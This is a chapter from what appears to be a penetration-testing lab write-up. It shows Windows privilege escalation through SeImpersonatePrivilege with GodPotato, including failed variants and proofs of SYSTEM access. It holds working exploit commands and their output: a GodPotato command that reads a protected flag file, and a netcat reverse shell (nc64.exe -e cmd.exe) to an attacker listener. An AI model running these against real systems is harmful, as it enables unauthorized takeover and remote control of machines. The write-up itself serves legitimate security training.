# 05 — Privilege escalation

`SeImpersonatePrivilege` on a high-integrity service token. This chapter is one successful attack and
four failed variants of it, because the failures are the interesting part: the exploit was never the
problem, the *process creation* was.

| Step | Runs on |
|---|---|
| 5.1 Why this is a Potato box | — |
| 5.2 GodPotato reads `proof.txt` | Kali → target |
| 5.3 Reading the escalation log | — |
| 5.4 Negative control | Kali → target |
| 5.5 What did not work, and why | Kali → target |
| 5.6 A real SYSTEM shell | Kali + target |
| 5.7 Independent proof of SYSTEM | — |

---

## 5.1 Why this is a Potato box

The token from chapter 04 has three properties that, together, are the whole attack:

| Property | Value | Why it matters |
|---|---|---|
| Integrity | High | the token is not filtered, so a stolen SYSTEM token can create a process |
| Privilege | `SeImpersonatePrivilege` enabled | the account may impersonate a token handed to it |
| Group | `BUILTIN\Users` | **no** administrative path — the privilege is the only way up |

`SeImpersonatePrivilege` lets a process take on an impersonation token produced by a local RPC/COM
call. The Potato family abuses that in a straight line:

1. Ask a privileged service — `RPCSS` over DCOM, or a named-pipe listener — for an authentication
   handshake.
2. The service authenticates **as `NT AUTHORITY\SYSTEM`**, which hands the client a SYSTEM
   impersonation token.
3. Impersonate it, then create a process. Because the token is high-integrity, the process is SYSTEM.

Two variants apply here, and both succeed on this host:

- **GodPotato-NET4** — no CLSID dependency; works on current builds.
- **JuicyPotatoNG** — a CLSID-scanning rewrite of the 2016 tool, which reports
  `authresult success {854A20FB-2D44-457D-992F-EF13785D2B51}` and `CreateProcessAsUser OK`.

The original `JuicyPotato` depends on one specific CLSID that Microsoft has since disabled, which is
why the `NG` rewrite scans for a live one instead. Both working variants are already staged in
`chris`'s temp directory, so the choice between them is convenience, not necessity. GodPotato is used
below because its `-cmd` argument takes a whole command line, which keeps the copy in 5.2 to a single
step.

## 5.2 GodPotato reads `proof.txt`

The target file is on the administrator's desktop and `chris` is denied it (chapter 04). The
escalation does not stage anything or change directory — it asks GodPotato to run one `cmd.exe` as
SYSTEM with the copy as its command, then reads the copy back **as `chris`**, which is what proves
the read happened at SYSTEM rather than being reported by the exploit:

```bash
cd ~/Desktop/Exploit && python3 1.py 192.168.137.151 "C:\Users\chris\AppData\Local\Temp\GodPotato-NET4.exe -cmd \"cmd /c copy /y C:\Users\Administrator\Desktop\proof.txt C:\Users\chris\AppData\Local\Temp\proof_out.txt\"" ; echo "=== now reading as chris ===" ; sleep 2 ; python3 1.py 192.168.137.151 "type C:\Users\chris\AppData\Local\Temp\proof_out.txt 2>&1"
```

```
Authenticated
Content-Type: api/response
Content-Length: 966

[*] CombaseModule: 0x140735549669376
[*] DispatchTable: 0x140735552120248
[*] UseProtseqFunction: 0x140735551452272
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] StartPipeServer
[*] CreateNamedPipe \\.\pipe\3b1b71a1-c843-4f35-8e93-35e0449f3123\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00008c02-0c20-ffff-323f-a86a0559d432
[*] DCOM obj OXID: 0x90badc438e744dbe
[*] DCOM obj OID: 0x92662114439d02d6
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 1000 Token:0x776  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 6856
        1 file(s) copied.

=== now reading as chris ===
Authenticated
Content-Type: api/response
Content-Length: 33

46586fc8f483adc13d76335768bf0a4c
```

The last block is the proof, and its shape matters: the second `python3 1.py` call is a **fresh
`chris` process** reading a file that a **SYSTEM** process wrote two seconds earlier. Nothing about
the reading context was elevated — the write was.

Two practical notes on the command itself:

- `copy /y` overwrites without prompting. Without `/y`, `copy` asks a question nobody can answer over
  a socket, and the call hangs until the wrapper times out.
- The destination is `chris`'s own `AppData\Local\Temp`, not `C:\Windows\Temp`. A file created by
  SYSTEM in `C:\Windows\Temp` inherits `CREATOR OWNER`, which can leave it unreadable by `chris`
  afterwards — the escalation succeeds and the flag is then unreadable by the account that asked for
  it. Writing into a directory the target user owns avoids that entirely.

## 5.3 Reading the escalation log

The log is verbose but only four lines matter:

| Line | Meaning |
|---|---|
| `Pipe Connected!` / `CurrentUser: NT AUTHORITY\NETWORK SERVICE` | the DCOM activation succeeded and RPCSS authenticated to the fake pipe |
| `PID : 1000 Token:0x776  User: NT AUTHORITY\SYSTEM` | a SYSTEM token was surfaced in that authentication |
| `Find System Token : True` | the token was captured — **this is the success condition** |
| `process start with pid 6856` | a child process was created with that token; `1 file(s) copied.` is its stdout |

`[*] UnmarshalObject: 0x80070776` looks alarming and is not. The DCOM unmarshal fails *after* the
token has been taken; the attack continues from an already-captured token. Reading that error as a
failure is the most common way to abandon a working exploit.

## 5.4 Negative control

Same file, same wrapper, same account, no escalation:

**On Kali**

```bash
python3 1.py 192.168.137.151 "type C:\Users\Administrator\Desktop\proof.txt 2>&1"
```

```
Authenticated
Content-Type: api/response
Content-Length: 18

Access is denied.
```

`Access is denied` before, `46586fc8f483adc13d76335768bf0a4c` after. The difference is the token,
not the path, the quoting, or the file.

## 5.5 What did not work, and why

Every attempt below reported `CurrentUser: NT AUTHORITY\SYSTEM` and `Find System Token : True`. None
of them produced a shell. The token was obtained each time — **the child process was the problem.**

The causes below are the ones consistent with each log. Only the working variant was verified end to
end; the failures were verified only by their absence of a connection.

| Attempt | Result | Cause (likely) |
|---|---|---|
| `GodPotato -cmd "powershell -nop -w h -ep bypass -f ...\rev4446.ps1"` | log shows SYSTEM + pid, **no connection** | the PowerShell arguments do not survive GodPotato's process creation; the child starts and exits |
| `GodPotato -cmd "...\run4446.bat"` | log shows SYSTEM + pid, **no connection** | `CreateProcess` cannot execute a `.bat` — it needs `cmd.exe`. A batch file is data, not an image |
| `GodPotato -cmd "cmd /c ...\run4446.bat"` | `Content-Length: 940`, empty body, **no connection** | the nested `cmd /c` string was split before GodPotato saw it |
| `GodPotato -cmd "...\nc64.exe -e powershell.exe <ip> 4447"` | **connects**, no prompt | `nc -e` takes one program name and **no arguments**; `powershell.exe` starts without `-nop`/`-ep` and prints nothing, so the session looks dead |

The run that worked is the simplest possible child: **`nc64.exe -e cmd.exe`**, an `.exe` starting an
`.exe`, with the arguments as plain positional values.

The payload was never at fault. The same `rev4446.ps1` connects immediately when launched directly as
`chris` — the connection was confirmed established:

```
ESTAB  0  0  192.168.45.158:4446  192.168.137.151:51317  users:(("nc",pid=128422,fd=4))
```

So the failure was entirely in the launch method, which is why the working escalation uses the
`nc64.exe -e cmd.exe` child and not a script.

One more trap, which produced a misleading result before it was understood:

**On Kali**

```bash
python3 1.py 192.168.137.151 "C:\Users\chris\AppData\Local\Temp\GodPotato-NET4.exe -cmd \"cmd /c (echo USERNAME=%USERNAME% & whoami.exe) > C:\Users\chris\AppData\Local\Temp\id.txt 2>&1\""
```

```
USERNAME=chris
```

`%USERNAME%` was expanded by the **outer** `cmd.exe` that FreeSWITCH spawned, before GodPotato ever
ran — so a file written during a SYSTEM escalation contains `USERNAME=chris`. That is pristine
evidence of the wrong thing. Never use `%VAR%` to describe the identity of an escalated child; read
the child's own output, or use a check the escalation itself cannot fake (5.7).

## 5.6 A real SYSTEM shell

A shell is more useful than a one-shot file copy, and it uses the working child from 5.5:

**On Kali**

```bash
nc -lvnp 4448
```

**On Kali**

```bash
python3 1.py 192.168.137.151 "C:\Users\chris\AppData\Local\Temp\GodPotato-NET4.exe -cmd \"C:\Users\chris\AppData\Local\Temp\nc64.exe -e cmd.exe 192.168.45.158 4448\""
```

```
listening on [any] 4448 ...
connect to [192.168.45.158] from (UNKNOWN) [192.168.137.151] 51358
Microsoft Windows [Version 10.0.19043.2130]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>type C:\Users\Administrator\Desktop\proof.txt
46586fc8f483adc13d76335768bf0a4c
```

Note the prompt: `C:\Windows\system32` this time, not `C:\Program Files\FreeSWITCH`. GodPotato's child
is created by `CreateProcessAsUser`, which does **not** inherit the caller's working directory or
handles — the SYSTEM shell starts in the system directory with no relationship to the PBX.

## 5.7 Independent proof of SYSTEM

`whoami` is not trustworthy in this particular shell: it printed **nothing at all** here, twice,
while `echo %USERNAME%` worked normally. The cause was not established, which is a reason to verify
identity more than one way.

Two checks that do work, and that `chris` cannot pass:

**In the SYSTEM shell**

```cmd
echo USER=%USERNAME% DOM=%USERDOMAIN%
reg query HKLM\SECURITY\Policy\PolAdtEv
```

```
USER=OSCP$ DOM=WORKGROUP

HKEY_LOCAL_MACHINE\SECURITY\Policy\PolAdtEv
    (Default)    REG_NONE    0001000009000000840000000100000003000000030003000100010000000100000000000000030000000000000
000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100010000000000000000000100000
00100000000000000000000000000000000000000000000006F0A05000B000E00030006000600060004000400
```

`USER=OSCP$` is the machine account — the identity a process gets when its token is SYSTEM and the
service name is not resolved. And `HKLM\SECURITY` has an ACL that grants access to **SYSTEM only**.
The same key, asked as `chris` through the wrapper:

**On Kali**

```bash
python3 1.py 192.168.137.151 "reg query HKLM\SECURITY\Policy\PolAdtEv 2>&1"
```

```
Authenticated
Content-Type: api/response
Content-Length: 26

ERROR: Access is denied.
```

So the registry read is a genuine boundary, not a formatting difference: **denied** for `chris`,
**succeeds** in the SYSTEM shell. That is a stronger statement than any `whoami` output, because it
depends on the actual token the process runs with rather than on a program's own report.

`hostname` in the same shell returned `OSCP`, confirming the target from chapter 01.

→ [06 — Flags](06-flags.md)
